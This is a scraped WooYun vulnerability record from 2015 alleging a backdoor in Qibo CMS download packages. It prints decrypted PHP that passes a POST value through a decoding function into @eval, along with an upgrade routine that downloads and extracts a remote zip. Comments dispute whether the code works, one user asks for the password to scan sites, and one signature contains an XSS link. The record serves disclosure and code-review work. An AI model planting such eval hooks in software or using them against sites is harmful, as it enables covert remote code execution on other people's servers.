{"id": 26036, "wybug_id": "wooyun-2015-0102744", "wybug_title": "齐博cms所有产品发现后门", "wybug_corp": "齐博CMS", "wybug_author": "路人甲", "wybug_date": "2015-03-20 23:52", "wybug_open_date": "2015-06-23 23:54", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-25：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-23：\t细节向公众公开  简要描述： 在另一个地方又发现后门了，敢不放后门吗？ 还有，压缩包下载下来的时候，360直接报有phpshell，360都看不下去了 = = 详细说明：  齐博cms整站系统 后门文件 ../hack/upgrade/admin.php CRC32 28510105 以及剩下的存在于博客系统 下载系统 考试系统 黄页系统 新闻媒体系统 图片系统 视频系统 知道系统 企业系统 B2B系统 等等（反正官网所有的下载包里都有这个后门）文件在 ../hack/upgrade/admin.php CRC32 5101A2EE 两个后门文件虽然CRC32值不同，不过解密后代码是相同的，采用威盾加密，V7的如下： \n\n解密代码见：http://blog.99tk.cn/wp-content/uploads/2015/03/20150319-141011-336.txt 其余的如下：\n\n解密代码见：http://blog.99tk.cn/wp-content/uploads/2015/03/20150319-141147-926.txt 加密后代码长，不贴了，解密后代码如下： \nif($_POST['mypwd']){\trequire_once(dirname(__FILE__).\"/../../inc/qq.api.php\");\t@eval(qqmd5(\"UV9AGx4fXkEQRAgeGkFFExhCWVELFglVQkwFVgwdAVgcREgWERQRUQsaQllFERtfe55b74ae89\",'DE',$_POST['mypwd']));//这是什么呢？}if($job==\"get\"&&$Apower[upgrade_ol]){\thack_admin_tpl('get');}elseif($action==\"get\"&&$Apower[upgrade_ol]){\t$fileurl=\"http://down.qibosoft.com/upgrade.zip\";\tif($code=file_get_contents($fileurl))\t{\t\twrite_file(ROOT_PATH.\"cache/upgrade.zip\",$code);\t}\telseif($code=file($fileurl))\t{\t\twrite_file(ROOT_PATH.\"cache/upgrade.zip\",$code);\t}\telseif(copy($fileurl,ROOT_PATH.\"cache/upgrade.zip\"))\t{\t}\telseif($code=sockOpenUrl($fileurl))\t{\t\twrite_file(ROOT_PATH.\"cache/upgrade.zip\",$code);\t}\trequire_once(ROOT_PATH.\"inc/class.z.php\");\t$z = new Zip;\tmakepath(ROOT_PATH.\"cache/upgrade\");\t$z->Extract(ROOT_PATH.\"cache/upgrade.zip\",ROOT_PATH.\"cache/upgrade\");\tunlink(ROOT_PATH.\"cache/upgrade.zip\");\techo \"<META HTTP-EQUIV=REFRESH CONTENT='0;URL=$webdb[www_url]/cache/upgrade/index.php'>\";\texit;}\n 对于该后门的分析可以见这儿： http://www.91ri.org/5147.html   漏洞证明：  对于该后门的分析可以见这儿： http://www.91ri.org/5147.html如图：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  删了~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-23 23:54 厂商回复：  最新状态： 2015-03-27：不是后门  ", "replys": "漏洞评价：\n评论\n     2015-03-21 00:42 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  沙发    \n     2015-03-21 00:58 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  升级文件夹那个吧.    \n     2015-03-21 01:02 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  ...........人留个后门容易么    \n     2015-03-21 02:36 |    \t\t老胖子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        )\t\t \n  http://wooyun.org/bugs/wooyun-2014-082750  官网不重视 直接忽略了。    \n     2015-03-21 08:41 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  ...........人留个后门容易么    \n     2015-03-21 09:34 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  360太强势。    \n     2015-03-21 22:53 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  糟糕，后门又被发现了    \n     2015-03-23 01:12 |    \t\tGnest \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 一地的白帽子)\t\t \n  ...........人留个后门容易么    \n     2015-03-23 21:28 |    \t\t暗羽 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:6        | 喵呜，给人类的智商跪了)\t\t \n  ...........人留个后门容易么    \n     2015-03-24 17:19 |    \t\t上官元恒 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:3        | 屌丝程序员一枚，上能修电脑，下能装系统。)\t\t \n  人留个后门容易么    \n     2015-04-04 16:19 |    \t\t黑色二进制 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:3        | 一只小白)\t\t \n  ...........人留个后门容易么    \n     2015-06-08 14:53 |    \t\t微尘 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:74        )\t\t \n  人留个后门容易么    \n     2015-06-24 00:29 |    \t\t带头大哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:81        | 很早前，我就有个梦想。哪一天能站在国家会...)\t\t \n  ...........人留个后门容易么    \n     2015-06-24 08:06 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  ...........人留个后门不容易    \n     2015-06-24 08:19 |    \t\t苏泽 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:19        | 大习科。)\t\t \n  ...........人留个后门不容易    \n     2015-06-24 08:41 |    \t\t这只猪 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 南无阿弥陀佛！)\t\t \n   后门连接密码多少？我去扫站去了    \n     2015-06-24 10:01 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  91ri那篇文章竟然是2013年发布的，难不成这漏洞存在了这么久吗？    \n     2015-06-24 10:13 |    \t\t泪雨无魂 \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:32        )\t\t \n  人留个后门不容易     \n     2015-06-24 11:04 |    \t\th3hz \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | 新手求收留)\t\t \n  最新状态：2015-03-27：不是后门    \n     2015-06-24 12:03 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  @这只猪 密码都摆在这里面“if($_POST['mypwd']){”这么简单的代码都看不懂你是怎么混到的乌云邀请码？    \n     2015-06-24 12:13 |    \t\tSoulmk \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 我是来学习滴~~)\t\t \n  请问不是后门是啥~~    \n     2015-06-24 13:04 |    \t\tMr.R \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:14        | 求大神带我飞 qq2584110147)\t\t \n  @昌维 我在贴吧见过你 0.0    \n     2015-06-24 14:29 |    \t\th3hz \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | 新手求收留)\t\t \n  头大，读完代码发现可控的只有$_POST['mypwd'],qqmd5(\"UV9AGx4fXkEQRAgeGkFFExhCWVELFglVQkwFVgwdAVgcREgWERQRUQsaQllFERtfe55b74ae89\",'DE',$_POST['mypwd'])  这个结果似乎并不可控，,然后没什么卵用，eval的结果总是失败,希望有人指教下    \n     2015-06-24 15:28 |    \t\ttestKaI \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        )\t\t \n  虽然看起来很像伪装得很好的shell，实际上仔细分析了一下貌似真的不是后门啊    \n     2015-06-24 15:43 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  @Mr.R 好巧    \n     2015-06-24 15:43 |    \t\th3hz \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | 新手求收留)\t\t \n  @testKaI 我还以为只有我一个人觉得这不是后门，传入自定义函数qqmd5后结果就不可控了，自然也没办法成功eval    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}